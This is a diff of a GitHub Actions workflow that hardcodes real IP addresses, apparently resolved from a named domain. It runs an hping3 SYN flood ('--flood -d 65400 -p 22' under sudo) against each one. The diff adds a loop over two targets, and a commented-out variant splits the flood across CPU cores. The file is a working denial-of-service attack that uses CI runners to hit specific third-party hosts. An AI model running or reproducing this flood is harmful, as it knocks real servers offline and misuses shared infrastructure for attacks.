@@ -74,16 +74,25 @@ jobs:
 
           # getent ahostsv4 ioswy.com
           # IP=$(getent ahostsv4 ioswy.com | awk '{print $1}' | head -n 1)
-          IP=43.154.103.141
-          echo "IP=$IP" >> $GITHUB_ENV
+          # IP=129.226.190.215
+          # echo "IP=$IP" >> $GITHUB_ENV
+
+          IP_LIST=(129.226.190.215 43.132.233.17)
+          echo "IP_LIST=\"${IP_LIST[*]}\"" >> $GITHUB_ENV
 
           timeout 120s yarn start
 
       - name: Step 2
         run: |
-          echo $IP
+          echo $IP_LIST
           echo "当前时间：$(date "+%Y-%m-%d %H:%M:%S")"
-          sudo timeout 60s hping3 -S --flood -V -d 65400 -p 22 -s 1000-65535 $IP
+          # sudo timeout 60s hping3 -S --flood -V -d 65400 -p 22 -s 1000-65535 $IP
+
+          for IP in "${IP_LIST[@]}"; do
+            echo $IP
+            echo "当前时间：$(date "+%Y-%m-%d %H:%M:%S")"
+            sudo timeout 60s hping3 -S --flood -V -d 65400 -p 22 -s 1000-65535 $IP
+          done
           
           # for i in {1..4}; do
           #   sudo timeout 60s taskset -c $((i-1)) hping3 -S --flood -V -d 65400 -p 22 -s $((1000 + 16134 * (i-1)))-$((1000 + 16134 * i - 1)) $IP &
